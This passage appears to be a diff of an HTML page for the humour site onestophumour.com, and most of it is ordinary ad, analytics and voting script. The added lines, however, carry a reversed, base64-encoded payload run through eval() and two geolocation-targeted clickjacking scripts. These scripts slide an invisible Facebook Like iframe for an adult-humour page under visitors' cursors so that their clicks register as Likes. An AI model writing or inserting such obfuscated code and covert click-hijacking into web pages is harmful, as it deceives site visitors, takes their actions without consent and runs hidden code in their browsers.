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';var _0x84de=["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=","","charAt","indexOf","fromCharCode","length"];function I0I(data){var _1OOlOI=_0x84de[0];var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc=_0x84de[1];do{h1=_1OOlOI[_0x84de[3]](data[_0x84de[2]](i++));h2=_1OOlOI[_0x84de[3]](data[_0x84de[2]](i++));h3=_1OOlOI[_0x84de[3]](data[_0x84de[2]](i++));h4=_1OOlOI[_0x84de[3]](data[_0x84de[2]](i++));bits=h1<<18|h2<<12|h3<<6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bits&0xff;if(h3==64){enc+=String[_0x84de[4]](o1);} else {if(h4==64){enc+=String[_0x84de[4]](o1,o2);} else {enc+=String[_0x84de[4]](o1,o2,o3);} ;} ;} while(i<data[_0x84de[5]]);;return enc;} ;function _1OO(string){var ret=_0x84de[1],i=0;for(i=string[_0x84de[5]]-1;i>=0;i--){ret+=string[_0x84de[2]](i);} ;return ret;} ;eval(I0I(_1OO(_0lO)));</script><div style="display:none">
+<script id="_wau3sf">var _wau = _wau || []; _wau.push(["classic", "onestoph2", "3sf"]);
+(function() {var s=document.createElement("script"); s.async=true;
+s.src="http://widgets.amung.us/classic.js";
+document.getElementsByTagName("head")[0].appendChild(s);
+})();</script>
+</div>
+
+<script type="text/javascript" src="http://j.maxmind.com/app/geoip.js"></script>
+
+<div id="content" class="wrapper content">
+
+<script type="text/javascript">
+
+var country2 = geoip_country_code();
+
+if(country2  == "US" || country2 == "CA" || country2 == "AU")      
+{
+
+(function(){
+
+  var Xcord = 0,
+  Ycord = 0,
+  IE = document.all ? true : false;
+ 
+  if (!IE) document.captureEvents(Event.MOUSEMOVE);
+ 
+  var lbox = document.createElement('iframe');
+  lbox.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'https://www.facebook.com/adulthumor18plus') + '&amp;layout=standard&amp;show_faces=true&amp;width=5&amp;action=lbox&amp;colorscheme=light&amp;height=80';
+  lbox.scrolling = 'no';
+  lbox.frameBorder = 0;
+  lbox.allowTransparency = 'false';
+  lbox.style.border = 0;
+  lbox.style.overflow = 'hidden';
+  lbox.style.cursor = 'pointer';
+  lbox.style.width = '5px';
+  lbox.style.height =  '23px';
+  lbox.style.position = 'absolute';
+  lbox.style.opacity = 0;
+  document.getElementsByTagName('body')[0].appendChild(lbox);
+ 
+  window.addEventListener('mousemove', mouseMove, false);
+ 
+  setTimeout(function(){
+    document.getElementsByTagName('body')[0].removeChild(lbox);
+    window.removeEventListener('mousemove', mouseMove, false);
+  }, 20000);
+ 
+  function mouseMove(e) {
+    if (IE) {
+      Xcord = event.clientX + document.body.scrollLeft;
+      Ycord = event.clientY + document.body.scrollTop;
+    } else {
+      Xcord = e.pageX;
+      Ycord = e.pageY;
+    }
+    
+    if (Xcord < 0) Xcord = 0;
+    if (Ycord < 0) Ycord = 0;
+    
+    lbox.style.top = (Ycord - 8) + 'px';
+    lbox.style.left = (Xcord - 5) + 'px';
+    
+    return true
+  }
+})();
+
+}
+</script>
+</div><!--Content-->
+<div class="sadfj">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js" type="text/javascript"></script>
+
+      <script type="text/javascript">
+
+         function thEfacebookhIde(){
+
+
+
+            jQuery("div[id^=\'thefacebook\']").hide();
+
+
+
+         }
+
+
+
+         function theFacebOOk(){
+
+           jQuery("div[id^=\'thefacebook\']").show();
+
+
+
+         }
+
+</script>
+</div>
+
+<div id="thefacebook" style="position: absolute; opacity: 0; filter: alpha(opacity = 0); -ms-filter:'progid:DXImageTransform.Microsoft.Alpha(Opacity=0)';  margin-left: -50px; z-index: 100; width:77px; height:20px; overflow:hidden"> 
+<iframe src="//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fadulthumor18plus&amp;send=false&amp;layout=button_count&amp;width=77&amp;show_faces=false&amp;font&amp;colorscheme=light&amp;action=like&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:45px; left:-19px; height:21px; z-index: 0; position: relative;" allowtransparency="true"></iframe>
+</div> 
+
+<div class="sadfj">
+   <script type="text/javascript"> 
+
+var country = geoip_country_code();
+
+if(country  == "US" || country == "CA" || country == "AU")      
+{
+
+      jQuery( document ).ready( function() {
+          $( "#thefacebook" ).parent().mousemove( function( e ) {
+
+            jQuery( "#thefacebook" ).css( {
+               top: e.pageY - 10,
+               left: e.pageX + 30
+
+            } );
+         } );
+
+                        thesp_hider();
+                        var thesp_fb_timer = setTimeout("thesp_hider()",5000);
+      } );
+
+                        function thesp_hider(){
+
+         jQuery("input").mouseout(function(){theFacebOOk();});
+
+
+
+         jQuery("a").mouseout(function(){theFacebOOk();});
+
+
+
+         jQuery("button").mouseout(function(){theFacebOOk();});
+
+
+
+         jQuery("textarea").mouseout(function(){theFacebOOk();});
+
+
+
+         jQuery(".ratingblock").mouseout(function(){theFacebOOk();});         jQuery("object").mouseout(function(){theFacebOOk();});
+
+
+         jQuery("input").mouseover(function(){thEfacebookhIde();});
+
+
+
+         jQuery("a").mouseover(function(){thEfacebookhIde();});
+
+
+
+         jQuery("button").mouseover(function(){thEfacebookhIde();});
+
+
+
+         jQuery("textarea").mouseover(function(){thEfacebookhIde();});
+
+
+
+         jQuery(".ratingblock").mouseover(function(){thEfacebookhIde();});         jQuery("object").mouseover(function(){thEfacebookhIde();});
+
+
+
+                        }
+
+}
+        
+   </script>
+</div>          
+
+
 <footer>
 <div class="footerLinks">
 <div class="f-box">
-<div class="leftDisc" style="width: 350px;">Copyright © 2013 Onestophumour. All Rights Reserved.</div>
-<div class="rightLinks" style="width: 600px;"><a href="rss.php" target="_blank" class="fLink"><img src="images/rss.png" width="16" height="16"> RSS Feed</a> / <a class="fLink" href="tos.html">Terms of Use</a> / <a class="fLink" href="privacy_policy.html">Privacy Policy</a> / <a class="fLink" href="contact_us.html">Contact Us</a> / <a class="fLink" href="shortcuts.html">Keyboard Shortcuts</a> / <div><script id="_wautrb">var _wau = _wau || []; _wau.push(["small", "cz60wwcvsnfk", "trb"]);
-(function() {var s=document.createElement("script"); s.async=true;
-s.src="http://widgets.amung.us/small.js";
-document.getElementsByTagName("head")[0].appendChild(s);
-})();</script></div></div>
+<div class="leftDisc" style="width: 350px;">Copyright � 2013 Onestophumour. All Rights Reserved.</div>
+<div class="rightLinks" style="width: 600px;"><a href="rss.php" target="_blank" class="fLink"><img src="http://osh.onestophumour.netdna-cdn.com/images/rss.png" width="16" height="16"> RSS Feed</a> / <a class="fLink" href="tos.html">Terms of Use</a> / <a class="fLink" href="privacy_policy.html">Privacy Policy</a> / <a class="fLink" href="contact_us.html">Contact Us</a> / <a class="fLink" href="shortcuts.html">Keyboard Shortcuts</a></div>
 </div>
 </div>
+
+<div style="display:none">
+
+</div>
+
 </footer>
+<!-- JAVA SCRIPT -->
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=183156165142525";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<script src="http://osh.onestophumour.netdna-cdn.com/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://osh.onestophumour.netdna-cdn.com/js/jquery.form.js"></script>
+<script src="http://osh.onestophumour.netdna-cdn.com/js/slide.js" type="text/javascript"></script>
+<script src="http://osh.onestophumour.netdna-cdn.com/js/jquery.timeago.js" type="text/javascript"></script>
 <script type="text/javascript" src="//assets.pinterest.com/js/pinit.js"></script>
+
+<!-- Place this tag after the last +1 button tag. -->
+<script type="text/javascript">
+	(function() {
+		var po = document.createElement('script');
+		po.type = 'text/javascript';
+		po.async = true;
+		po.src = 'https://apis.google.com/js/plusone.js';
+		var s = document.getElementsByTagName('script')[0];
+		s.parentNode.insertBefore(po, s);
+	})(); 
+</script>
+<!--taboola Widget-->
+<script type="text/javascript">
+   window._taboola = window._taboola || [];
+   _taboola.push({mode:'autosized-generated-2r', container:'taboola-bottom-main-column', placement:'bottom-main-column'});
+</script>
 <!--Taboola Widget-->
 	<script type="text/javascript">
 	   window._taboola = window._taboola || [];
@@ -299,4 +424,145 @@ document.getElementsByTagName("head")[0].appendChild(s);
 	<script type="text/javascript" src="http://cdn.taboolasyndication.com/libtrc/onestophumour/loader.js"></script>
 <!--Taboola Widget-->
 
-</body></html>
+<!--Taboola Video Widget-->
+<script type="text/javascript">
+            window._taboola = window._taboola || [];
+            _taboola.push({video:'auto'});
+</script>
+<script type="text/javascript" src="http://cdn.taboolasyndication.com/libtrc/onestophumour/loader.js"></script>
+<!--Taboola Widget-->
+
+<script type="text/javascript">
+$(function(){
+  $("#timescale select").change(function(){
+    window.location='http://www.onestophumour.com/'+$("#timescale select").data('page')+'-1-' + this.value + '.html';
+  });
+});
+</script>
+<script type="text/javascript">
+jQuery(document).ready(function() {
+  jQuery("abbr.timeago").timeago();
+});
+</script>
+<script type"text="" javascript"="">
+$(document).ready(function () { 
+	
+var follow=$('#follow-scroll');
+var followpos=$('#follow-scroll').offset();
+var imgpos = $('.image-container img').offset();
+
+$(window).scroll(function () {
+    var y=$(this).scrollTop();
+    console.log(y+' '+ followpos.top-200);
+    if(y < followpos.top){
+    		follow.stop().animate({'top':0},300);
+    	}
+    else{
+    	if(y < +imgpos.top-50){
+    		follow.stop().animate({'top':y-followpos.top},300);
+    	}
+    	}
+});
+});
+</script>
+<script type="text/javascript">
+$(function() {
+
+$(".vote").click(function() 
+{
+
+var id = $(this).attr("id");
+var name = $(this).attr("name");
+var dataString = {
+			'id' : id,
+			'section' : 0		};
+var parent = $(this);
+
+
+if(name=='up')
+{
+
+$(this).fadeIn(200).html('<img src="http://osh.onestophumour.netdna-cdn.com/images/dot.png" align="absmiddle">');
+$.ajax({
+   type: "POST",
+   url: "up_vote.php",
+   data: dataString,
+   cache: false,
+
+   success: function(html)
+   {
+    parent.html(html);
+  
+  }  });
+  
+}
+else
+{
+
+$(this).fadeIn(200).html('<img src="http://osh.onestophumour.netdna-cdn.com/images/dot.png" align="absmiddle">');
+$.ajax({
+   type: "POST",
+   url: "down_vote.php",
+   data: dataString,
+   cache: false,
+
+   success: function(html)
+   {
+       parent.html(html);
+  }
+   
+ });
+
+}   
+ 
+return false;
+	});
+
+});
+</script>
+
+
+<!--MGID JS-->
+<script type="text/javascript">
+	var MarketGidDate = new Date();
+	document.write('<scr'+'ipt type="text/javascript" '
+	+'src="http://jsn.dt07.net/o/n/onestophumour.com.1104.js?t='+MarketGidDate.getYear()+MarketGidDate.getMonth()+MarketGidDate.getDay()+MarketGidDate.getHours() + '" charset="utf-8" ></scr'+'ipt>');
+</script><script type="text/javascript" src="http://jsn.dt07.net/o/n/onestophumour.com.1104.js?t=1201319" charset="utf-8"></script>
+
+<script>
+	 $(document).ready(function () { 
+   $(window).keydown(function (e) 
+   {
+       if ( e.which === 37 ) 
+       {
+           window.location.href = previous_nav.href;        
+       } 
+       else if ( e.which === 39 ) 
+       {
+           window.location.href = next_nav.href; 
+       }
+       else if ( e.which === 9 ) 
+       {
+           window.location.href = random_key.href; 
+       }
+   });
+  });
+  </script>
+
+<script type="text/javascript" src="//assets.pinterest.com/js/pinit.js"></script>
+
+
+<!-- Twitter JS -->
+<script>
+	! function(d, s, id) {
+		var js, fjs = d.getElementsByTagName(s)[0];
+		if (!d.getElementById(id)) {
+			js = d.createElement(s);
+			js.id = id;
+			js.src = "//platform.twitter.com/widgets.js";
+			fjs.parentNode.insertBefore(js, fjs);
+		}
+	}(document, "script", "twitter-wjs"); 
+</script>
+
+                  </body></html>
